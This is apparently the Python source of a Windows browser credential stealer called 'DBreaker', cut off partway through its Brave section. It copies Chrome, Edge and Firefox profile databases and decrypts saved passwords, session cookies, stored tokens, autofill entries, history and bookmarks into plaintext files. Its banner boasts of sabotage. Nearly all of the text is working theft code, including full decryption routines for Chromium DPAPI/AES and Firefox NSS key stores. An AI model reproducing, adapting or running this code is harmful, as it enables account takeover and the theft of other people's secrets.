import os,json,base64,sqlite3,win32crypt,shutil,click,re,random,hmac
from pyasn1.codec.der import decoder;from hashlib import sha1,pbkdf2_hmac
from struct import unpack;from binascii import hexlify,unhexlify
from rich.console import Console;from rich.table import Table;from rich.theme import Theme
from Crypto.Cipher import DES3,AES;from Crypto.Util.number import long_to_bytes;from Crypto.Util.Padding import unpad 
from time import sleep,localtime
if os.name=='nt':pass
else:exit('[!] Not Suppoted ')
custom_theme=Theme({'success': 'green', 'error': 'bold red'})
console=Console(theme=custom_theme)

#Tested on Python 3.11 Windows 10 Browsers latest update
#By Filza2 (https://github.com/Filza2/DBreaker/)


def Main():
    os.system('cls')
    console.print(f"""
██████╗       ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗      ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██║  ██║█████╗██████╔╝██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝
██║  ██║╚════╝██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝      ██████╔╝██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝       ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

                    [bold white] By @TweakPY - @vv1ck [/bold white]                                         
""",style='error',justify='left')
def banner():
    words=[
        "Master, I will not let you down, and I will break all the databases",
        "Oh hello again, would you like a cup of coffee?",
        "I'm not good at serving anyone but I can tell you I'm good at sabotaging anything and anyone",
        "Do you want to try something new today, for example,  prove that browsers are not safe?",
        "I'm fine, thanks for not asking",
        "I knew you would come",
        "Sabotage is what I do",
        "I don't like to tell you this but you are not safe if you are using a 'password manager'.",
        "Yesterday you said tomorrow. ",
        "If you try and fail, congratulation, a lot of don't try yet.",
        "Take the risk or lose the chance",
        "Whatever you do, do it well.",
        "Do not waste your time ~",
        "Nothing for now"
        ]  
    console.print(
    random.choice(words),
    ":coffee:"+'\n',
    justify='left',
    style='error',
    )
def cls():os.system('cls')
def get_master_key(local_state_path):
    # Decryption algorithm copied from https://github.com/Aquilao/GetChromeData
    with open(os.environ['USERPROFILE']+os.sep+local_state_path,"r",encoding='utf-8') as f:
        local_state=f.read()
        local_state=json.loads(local_state)
    master_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key=master_key[5:] 
    master_key=win32crypt.CryptUnprotectData(master_key,None,None,None,0)[1]
    return master_key
def decrypt_payload(cipher,payload):return cipher.decrypt(payload)
def generate_cipher(aes_key,iv):return AES.new(aes_key,AES.MODE_GCM,iv)
def decrypt_value(buff,master_key):
    try:
        iv=buff[3:15]
        payload=buff[15:]
        cipher=generate_cipher(master_key,iv)
        decrypted_pass=decrypt_payload(cipher,payload)
        decrypted_pass=decrypted_pass[:-16].decode()  
        return decrypted_pass
    except Exception as e:return "Error !"
def decrypt_value_all_version(value,master_key):
    if value[0:3]==b'v10':decrypted_value=decrypt_value(value,master_key)# Chrome > 80
    else:decrypted_value=win32crypt.CryptUnprotectData(value)[1].decode()# Chrome < 80
    return decrypted_value


def Chrome_Login(main_db,master_key):
    try:
        i=0
        shutil.copy2(main_db+'Login Data',"Temp/Chrome_Login.db")
        conn=sqlite3.connect("Temp/Chrome_Login.db");cursor=conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url,username,en_password in cursor.fetchall():
            de_password=decrypt_value_all_version(en_password,master_key)
            if len(username) > 0:
                data="URL: "+url+"\nUsername: "+username+"\nPassword: "+de_password+"\n"+"-"*50+"\n"
                with open('Results/Google Chrome/Chrome_Login.txt','a',encoding='utf-8') as f:f.write(data)
                i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome Login:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the logins of Google Chrome !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome Login:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Google Chrome Logins  ! ");pass

def Chrome_cookies(main_db,master_key):
    try:
        i=0
        shutil.copy2(main_db+r'\Network\Cookies',"Temp/Chrome_Cookies.db")
        conn=sqlite3.connect("Temp/Chrome_Cookies.db");conn.text_factory=bytes;cursor=conn.cursor()
        cursor.execute("select host_key,name,encrypted_value from cookies;")
        for host,name,en_cookies in cursor.fetchall():
            de_cookies=decrypt_value_all_version(en_cookies,master_key)
            name=re.findall("b'(.*?)'",str(name))[0];host=re.findall("b'(.*?)'",str(host))[0]
            data=f"Host: {str(host)}\nName: {str(name)}\nCookie: {str(de_cookies)}"+"\n"+"-"*50+"\n"
            with open('Results/Google Chrome/Chrome_Cookies.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome Cookies:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Cookies of Google Chrome !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome Cookies:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Google Chrome Cookies  ! ");pass
    
def Chrome_TS(main_db,master_key):
    try:
        i=0
        shutil.copy2(main_db+'\Web Data',"Temp/Chrome_Token_service.db")
        conn=sqlite3.connect("Temp/Chrome_Token_service.db");cursor=conn.cursor()
        cursor.execute("SELECT service, encrypted_token FROM token_service;")
        for name,en_value in cursor.fetchall():
            de_value=decrypt_value_all_version(en_value,master_key)
            data="Name: "+name+"\nValue: "+de_value+"\n"+"-"*50+"\n" 
            with open('Results/Google Chrome/Chrome_Token_service.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome TS:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Token service of Google Chrome !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome TS:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Google Chrome Token service  ! ");pass
    
def Chrome_History(main_db):
    try:
        i=0
        shutil.copy2(main_db+'\History',"Temp/Chrome_History.db")
        conn=sqlite3.connect("Temp/Chrome_History.db");cursor=conn.cursor()
        cursor.execute("SELECT url,title FROM urls;")
        for url,title in cursor.fetchall():
            data="Title: "+title+"\nURL: "+url+"\n"+"-"*50+"\n"
            with open('Results/Google Chrome/Chrome_History.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome History:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the history of Google Chrome !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome History:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Google Chrome history  ! ");pass
    
def Chrome_Downloads(main_db):
    try:
        i=0
        shutil.copy2(main_db+'\History',"Temp/Chrome_Downloads.db")
        conn=sqlite3.connect("Temp/Chrome_Downloads.db");cursor=conn.cursor()
        cursor.execute("SELECT target_path, tab_url FROM downloads;")
        for target_path,tap_url in cursor.fetchall():
            data="URL: "+tap_url+"\nPath: "+target_path+"\n"+"-"*50+"\n" 
            with open('Results/Google Chrome/Chrome_Downloads.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome Downloads:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Downloads of Google Chrome !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome Downloads:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Google Chrome Downloads  ! ");pass
    
def Chrome_Bookmarks(main_db):
    try:
        t=0
        shutil.copy2(main_db+'\Bookmarks',"Temp/Chrome_Bookmarks.json")
        with open("Temp/Chrome_Bookmarks.json",'r',encoding="utf-8") as f:
            json_data=f.read()
            name=re.findall("\"name\": \"(.*?)\",([\s\S]*?)\"type\": \"url\"",json_data, re.S)
            url=re.findall("\"url\": \"(.*?)\"",json_data, re.S)
            for i in range(0,len(url)):
                data="Name: "+name[i][0]+"\nURL: "+url[i]+"\n"+"-"*50+"\n" 
                with open('Results/Google Chrome/Chrome_Bookmarks.txt','a',encoding="utf-8") as f:f.write(data)
                t+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome Bookmarks:{t}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the bookmarks of Google Chrome !")
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome Bookmarks:{t}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Google Chrome bookmarks  ! ",e);pass
    
def Chrome_Autofill(main_db):
    try:
        i=0
        shutil.copy2(main_db+'\Web Data',"Temp/Chrome_Autofill.db")
        conn=sqlite3.connect("Temp/Chrome_Autofill.db");cursor=conn.cursor()
        cursor.execute("SELECT name, value FROM autofill;")
        for name,value in cursor.fetchall():
            data="Name: "+name+"\nValue: "+value+"\n"+"-"*50+"\n" 
            with open('Results/Google Chrome/Chrome_Autofill.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome Autofill:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Autofill data of Google Chrome !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Google Chrome Autofill:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Google Chrome Autofill data  ! ");pass


def Firefox_Login():
    # Decryption algorithm copied from https://github.com/lclevy/firepwd
    done=50
    oidValues={b'2a864886f70d010c050103': '1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC',b'2a864886f70d0307':'1.2.840.113549.3.7 des-ede3-cbc',b'2a864886f70d010101':'1.2.840.113549.1.1.1 pkcs-1',b'2a864886f70d01050d':'1.2.840.113549.1.5.13 pkcs5 pbes2', b'2a864886f70d01050c':'1.2.840.113549.1.5.12 pkcs5 PBKDF2',b'2a864886f70d0209':'1.2.840.113549.2.9 hmacWithSHA256',b'60864801650304012a':'2.16.840.1.101.3.4.1.42 aes256-CBC'}   
    CKA_ID=unhexlify('f8000000000000000000000000000001')
    def getShortLE(d,a):return unpack('<H',(d)[a:a+2])[0]
    def getLongBE(d,a):return unpack('>L',(d)[a:a+4])[0] 
    def printASN1(d,l,rl):
        type=d[0]
        length=d[1]
        if length&0x80 > 0: 
            nByteLength=length&0x7f
            length=d[2]  
            skip=1
        else:
            skip=0    
        if type==0x30:
            seqLen=length
            readLen=0
            while seqLen>0:
                len2=printASN1(d[2+skip+readLen:], seqLen, rl+1)
                seqLen=seqLen-len2
                readLen=readLen+len2
            return length+2
        elif type==6:
            oidVal=hexlify(d[2:2+length]) 
            if oidVal in oidValues:pass
            else:done=0
            return length+2
        elif type==4: 
            return length+2
        elif type==5: 
            return length+2
        elif type==2: 
            return length+2
        else:
            if length==l-2:
                return length        
    def readBsddb(name):   
        f=open(name,'rb')
        header=f.read(4*15)
        magic=getLongBE(header,0)
        if magic != 0x61561:done=0
        version=getLongBE(header,4)
        if version !=2:done=0
        pagesize=getLongBE(header,12)
        nkeys=getLongBE(header,0x38) 
        readkeys=0
        page=1
        nval=0
        val=1
        db1=[]
        while (readkeys < nkeys):
            f.seek(pagesize*page)
            offsets=f.read((nkeys+1)* 4 +2)
            offsetVals=[]
            i=0
            nval=0
            val=1
            keys=0
            while nval != val:
                keys+=1
                key=getShortLE(offsets,2+i)
                val=getShortLE(offsets,4+i)
                nval=getShortLE(offsets,8+i)
                offsetVals.append(key+ pagesize*page)
                offsetVals.append(val+ pagesize*page)  
                readkeys+=1
                i+=4
            offsetVals.append(pagesize*(page+1))
            valKey=sorted(offsetVals)  
            for i in range( keys*2 ):
                f.seek(valKey[i])
                data=f.read(valKey[i+1]-valKey[i])
                db1.append(data)
            page+=1
        f.close()
        db={}
        for i in range( 0, len(db1), 2):
            db[ db1[i+1] ] = db1[ i ]
        return db  
    def decryptMoz3DES(globalSalt,masterPassword,entrySalt,encryptedData):
        hp=sha1(globalSalt+masterPassword).digest()
        pes=entrySalt+b'\x00'*(20-len(entrySalt))
        chp=sha1( hp+entrySalt ).digest()
        k1=hmac.new(chp, pes+entrySalt, sha1).digest()
        tk=hmac.new(chp, pes, sha1).digest()
        k2=hmac.new(chp, tk+entrySalt, sha1).digest()
        k=k1+k2
        iv=k[-8:]
        key=k[:24]
        return DES3.new(key,DES3.MODE_CBC,iv).decrypt(encryptedData)
    def decodeLoginData(data):
        asn1data=decoder.decode(base64.b64decode(data)) 
        key_id=asn1data[0][0].asOctets()
        iv=asn1data[0][1][1].asOctets()
        ciphertext=asn1data[0][2].asOctets()
        return key_id,iv,ciphertext 
    def getLoginData():
        logins=[]
        sqlite_file=main_db+'\signons.sqlite'
        json_file=main_db+'\logins.json'
        if 'logins.json' in os.listdir(main_db):
            loginf=open(json_file,'r').read()
            jsonLogins=json.loads(loginf)
            if 'logins' not in jsonLogins:return []
            for row in jsonLogins['logins']:
                encUsername=row['encryptedUsername']
                encPassword=row['encryptedPassword']
                logins.append((decodeLoginData(encUsername),decodeLoginData(encPassword),row['hostname']))
            return logins  
        if 'signons.sqlite' in os.listdir(main_db): 
            conn=sqlite3.connect(sqlite_file)
            c=conn.cursor()
            c.execute("SELECT * FROM moz_logins;")
            for row in c:
                encUsername=row[6]
                encPassword=row[7]
                logins.append((decodeLoginData(encUsername),decodeLoginData(encPassword),row[1]))
            return logins
        else:done=0
    def extractSecretKey(masterPassword,keyData):
        pwdCheck=keyData[b'password-check']
        entrySaltLen=pwdCheck[1]
        entrySalt=pwdCheck[3: 3+entrySaltLen]
        encryptedPasswd=pwdCheck[-16:]
        globalSalt=keyData[b'global-salt']
        cleartextData = decryptMoz3DES( globalSalt, masterPassword, entrySalt, encryptedPasswd )
        if cleartextData != b'password-check\x02\x02':done=0
        if CKA_ID not in keyData:return None
        privKeyEntry=keyData[CKA_ID]
        saltLen=privKeyEntry[1]
        nameLen=privKeyEntry[2]
        privKeyEntryASN1=decoder.decode(privKeyEntry[3+saltLen+nameLen:])
        data=privKeyEntry[3+saltLen+nameLen:]
        entrySalt=privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData=privKeyEntryASN1[0][1].asOctets()
        privKey=decryptMoz3DES(globalSalt,masterPassword,entrySalt,privKeyData) 
        privKeyASN1=decoder.decode(privKey)
        prKey=privKeyASN1[0][2].asOctets()
        prKeyASN1=decoder.decode(prKey)
        id=prKeyASN1[0][1]
        key=long_to_bytes(prKeyASN1[0][3])
        return key
    def decryptPBE(decodedItem,masterPassword,globalSalt):
        pbeAlgo=str(decodedItem[0][0][0])
        if pbeAlgo=='1.2.840.113549.1.12.5.1.3':
            entrySalt=decodedItem[0][0][1][0].asOctets()
            cipherT=decodedItem[0][1].asOctets()
            key=decryptMoz3DES(globalSalt,masterPassword,entrySalt,cipherT)
            return key[:24],pbeAlgo
        elif pbeAlgo=='1.2.840.113549.1.5.13':
            assert str(decodedItem[0][0][1][0][0])=='1.2.840.113549.1.5.12'
            assert str(decodedItem[0][0][1][0][1][3][0])=='1.2.840.113549.2.9'
            assert str(decodedItem[0][0][1][1][0])=='2.16.840.1.101.3.4.1.42'
            entrySalt=decodedItem[0][0][1][0][1][0].asOctets()
            iterationCount=int(decodedItem[0][0][1][0][1][1])
            keyLength=int(decodedItem[0][0][1][0][1][2])
            assert keyLength==32 
            k=sha1(globalSalt+masterPassword).digest()
            key=pbkdf2_hmac('sha256',k,entrySalt,iterationCount,dklen=keyLength)    
            iv=b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
            cipherT=decodedItem[0][1].asOctets()
            clearText=AES.new(key,AES.MODE_CBC,iv).decrypt(cipherT)
            return clearText,pbeAlgo
    def getKey(masterPassword):  
        if 'key4.db' in os.listdir(main_db):
            conn=sqlite3.connect(main_db+'\key4.db')
            c=conn.cursor()
            c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
            row=c.fetchone()
            globalSalt=row[0]
            item2=row[1]
            decodedItem2=decoder.decode(item2) 
            clearText,algo=decryptPBE( decodedItem2, masterPassword, globalSalt)
            if clearText==b'password-check\x02\x02': 
                c.execute("SELECT a11,a102 FROM nssPrivate;")
                for row in c:
                    if row[0] != None:break
                a11=row[0]
                a102=row[1] 
                if a102==CKA_ID: 
                    decoded_a11=decoder.decode(a11)
                    clearText,algo=decryptPBE(decoded_a11,masterPassword,globalSalt)
                    return clearText[:24],algo
                else:done=0     
            return None,None
        elif 'key3.db' in os.listdir(main_db):
            keyData=readBsddb(main_db+'\key3.db')
            key=extractSecretKey(masterPassword,keyData)
            return key,'1.2.840.113549.1.12.5.1.3'
        else:
            done=0
            return None,None
    try:
        temp_db=os.getenv('APPDATA')+"\\Mozilla\\Firefox\\Profiles\\"
        for name in os.listdir(temp_db):main_db=temp_db+name
        masterPassword=''
        key,algo=getKey(masterPassword.encode())
        if key==None:done=0
        logins=getLoginData()
        if len(logins)==0:print('no stored passwords');done=1
        if algo=='1.2.840.113549.1.12.5.1.3' or algo=='1.2.840.113549.1.5.13':  
            t=0
            for i in logins:
                assert i[0][0]==CKA_ID
                iv=i[0][1]
                ciphertext=i[0][2] 
                iv2=i[1][1]
                ciphertext2=i[1][2] 
                host=str(i[2]) 
                username=unpad(DES3.new(key,DES3.MODE_CBC,iv).decrypt(ciphertext),8);username=re.findall("b'(.*?)'",str(username))[0]
                password=unpad(DES3.new(key,DES3.MODE_CBC,iv2).decrypt(ciphertext2),8);password=re.findall("b'(.*?)'",str(password))[0]
                data="Username: "+username+"\nPassword: "+password+"\nHost: "+host+"\n"+"-"*50+"\n" 
                with open('Results/Mozilla Firefox/Firefox_Login.txt','a',encoding="utf-8") as f:f.write(data)
                t+=1
            with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Logins:{t}:✅\n')
            console.print("[+] We have [success]succeeded[/success] in extracting the logins of Mozilla Firefox !")
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Logins:{t}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox logins  ! ",e);pass
        
def Firefox_Cookies(main_db2):
    try:
        i=0
        shutil.copy2(main_db2+"\cookies.sqlite","Temp/Firefox_cookies.db")
        conn=sqlite3.connect('Temp/Firefox_cookies.db');cursor=conn.cursor()
        cursor.execute("select id,name,value,host from moz_cookies;")
        for id,name,value,host in cursor.fetchall():
            data=f"ID: {id}"+"\nHost: "+host+"\nName: "+name+"\nValue: "+value+"\n"+"-"*50+"\n" 
            with open('Results/Mozilla Firefox/Firefox_Cookies.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Cookies:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the cookies of Mozilla Firefox !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Cookies:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox cookies  ! ");pass
    
def Firefox_History(main_db2):
    try:
        i=0
        shutil.copy2(main_db2+"\places.sqlite","Temp/Firefox_History.db")
        conn=sqlite3.connect('Temp/Firefox_History.db');cursor=conn.cursor()
        cursor.execute("select id,url,title from moz_places;")
        for id,url,title in cursor.fetchall():
            if title==None:title='Null'
            data=f"ID: {id}"+"\nTitle: "+title+"\nURL: "+url+"\n"+"-"*50+"\n" 
            with open('Results/Mozilla Firefox/Firefox_History.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox History:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the history of Mozilla Firefox !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox History:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox history  ! ");pass
    
def Firefox_Downloads(main_db2):
    try:
        i=0
        shutil.copy2(main_db2+"\places.sqlite","Temp/Firefox_Downloads.db")
        conn=sqlite3.connect('Temp/Firefox_Downloads.db');cursor=conn.cursor()
        cursor.execute("select content from moz_annos;")
        for content in cursor.fetchall():
            data=f"Content: "+str(content)+"\n"+"-"*50+"\n" 
            with open('Results/Mozilla Firefox/Firefox_Downloads.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Downloads:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Downloads of Mozilla Firefox !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Downloads:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox Downloads  ! ");pass

def Firefox_Bookmarks(main_db2):
    try:
        i=0
        shutil.copy2(main_db2+"\places.sqlite","Temp/Firefox_Bookmarks.db")
        conn=sqlite3.connect('Temp/Firefox_Bookmarks.db');cursor=conn.cursor()
        cursor.execute("select id,title from moz_bookmarks;")
        for id,title in cursor.fetchall():
            if title==None or title=='':pass
            data="Title: "+title+"\n"+"-"*50+"\n" 
            with open('Results/Mozilla Firefox/Firefox_Bookmarks.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Bookmarks:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Bookmarks of Mozilla Firefox !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Bookmarks:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox Bookmarks  ! ");pass

def Firefox_lastsearch(main_db2):
    try:
        i=0
        shutil.copy2(main_db2+r"\formhistory.sqlite","Temp/Firefox_LastSearch.db")
        conn=sqlite3.connect('Temp/Firefox_LastSearch.db');cursor=conn.cursor()
        cursor.execute("select fieldname,value from moz_formhistory;")
        for fieldname,value in cursor.fetchall():
            data=f"Value: {value}\nFieldName: {fieldname}"+"\n"+"-"*50+"\n" 
            with open('Results/Mozilla Firefox/Firefox_LastSearch.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox lastsearch:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the LastSearch of Mozilla Firefox !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox lastsearch:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox LastSearch  ! ");pass


def Edge_Login(main_db3,master_key):
    try:
        i=0
        shutil.copy2(main_db3+'Login Data',"Temp/Edge_Login.db")
        conn=sqlite3.connect("Temp/Edge_Login.db");cursor=conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url,username,en_password in cursor.fetchall():
            de_password=decrypt_value_all_version(en_password,master_key)
            if len(username) > 0:
                data="URL: "+url+"\nUsername: "+username+"\nPassword: "+de_password+"\n"+"-"*50+"\n"
                with open('Results/Microsoft Edge/Edge_Login.txt','a',encoding='utf-8') as f:f.write(data)
                i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge Login:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the logins of Microsoft Edge !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge Login:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Microsoft Edge Logins  ! ");pass

def Edge_cookies(main_db3,master_key):
    try:
        i=0
        shutil.copy2(main_db3+r'\Network\Cookies',"Temp/Edge_Cookies.db")
        conn=sqlite3.connect("Temp/Edge_Cookies.db");conn.text_factory=bytes;cursor=conn.cursor()
        cursor.execute("select host_key,name,encrypted_value from cookies;")
        for host,name,en_cookies in cursor.fetchall():
            de_cookies=decrypt_value_all_version(en_cookies,master_key)
            name=re.findall("b'(.*?)'",str(name))[0];host=re.findall("b'(.*?)'",str(host))[0]
            data=f"Host: {str(host)}\nName: {str(name)}\nCookie: {str(de_cookies)}"+"\n"+"-"*50+"\n"
            with open('Results/Microsoft Edge/Edge_Cookies.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge Cookies:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Cookies of Microsoft Edge !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge Cookies:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Microsoft Edge Cookies  ! ");pass
    
def Edge_History(main_db3):
    try:
        i=0
        shutil.copy2(main_db3+'\History',"Temp/Edge_History.db")
        conn=sqlite3.connect("Temp/Edge_History.db");cursor=conn.cursor()
        cursor.execute("SELECT url,title FROM urls;")
        for url,title in cursor.fetchall():
            data="Title: "+title+"\nURL: "+url+"\n"+"-"*50+"\n"
            with open('Results/Microsoft Edge/Edge_History.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge History:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the history of Microsoft Edge !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge History:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Microsoft Edge history  ! ");pass
    
def Edge_Downloads(main_db3):
    try:
        i=0
        shutil.copy2(main_db3+'\History',"Temp/Edge_Downloads.db")
        conn=sqlite3.connect("Temp/Edge_Downloads.db");cursor=conn.cursor()
        cursor.execute("SELECT target_path, tab_url FROM downloads;")
        for target_path,tap_url in cursor.fetchall():
            data="URL: "+tap_url+"\nPath: "+target_path+"\n"+"-"*50+"\n" 
            with open('Results/Microsoft Edge/Edge_Downloads.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge Downloads:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Downloads of Microsoft Edge !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge Downloads:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Microsoft Edge Downloads  ! ");pass
    
def Edge_Bookmarks(main_db3):
    try:
        t=0
        shutil.copy2(main_db3+'\Bookmarks',"Temp/Edge_Bookmarks.json")
        with open("Temp/Edge_Bookmarks.json",'r',encoding="utf-8") as f:
            json_data=f.read()
            name=re.findall("\"name\": \"(.*?)\",([\s\S]*?)\"type\": \"url\"",json_data, re.S)
            url=re.findall("\"url\": \"(.*?)\"",json_data, re.S)
            for i in range(0,len(url)):
                data="Name: "+name[i][0]+"\nURL: "+url[i]+"\n"+"-"*50+"\n" 
                with open('Results/Microsoft Edge/Edge_Bookmarks.txt','a',encoding="utf-8") as f:f.write(data)
                t+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge Bookmarks:{t}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the bookmarks of Microsoft Edge !")
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge Bookmarks:{t}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Microsoft Edge bookmarks  ! ",e);pass
    
def Edge_Autofill(main_db3):
    try:
        i=0
        shutil.copy2(main_db3+'\Web Data',"Temp/Edge_Autofill.db")
        conn=sqlite3.connect("Temp/Edge_Autofill.db");cursor=conn.cursor()
        cursor.execute("SELECT name, value FROM autofill;")
        for name,value in cursor.fetchall():
            data="Name: "+name+"\nValue: "+value+"\n"+"-"*50+"\n" 
            with open('Results/Microsoft Edge/Edge_Autofill.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge Autofill:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Autofill data of Microsoft Edge !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Microsoft Edge Autofill:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Microsoft Edge Autofill data  ! ");pass
    

def Brave_Login(main_db4,master_key):
    try:
        i=0
        shutil.copy2(main_db4+'Login Data',"Temp/Brave_Login.db")
        conn=sqlite3.connect("Temp/Brave_Login.db");cursor=conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
